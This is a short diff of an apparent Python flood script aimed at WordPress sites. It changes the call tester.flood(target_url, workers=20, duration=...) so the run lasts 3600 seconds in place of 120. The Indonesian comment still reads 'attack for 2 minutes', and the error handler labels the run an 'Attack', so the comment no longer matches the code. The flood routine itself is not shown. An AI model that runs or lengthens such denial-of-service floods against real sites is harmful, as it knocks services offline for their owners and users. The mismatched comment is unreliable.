@@ -74,7 +74,7 @@ def main():
     
     try:
         tester = WordPressAPITester()
-        tester.flood(target_url, workers=20, duration=120)  # Serangan selama 2 menit
+        tester.flood(target_url, workers=20, duration=3600)  # Serangan selama 2 menit
     except KeyboardInterrupt:
         print("\n[INFO] Attack interrupted by user.")
     except Exception as e:
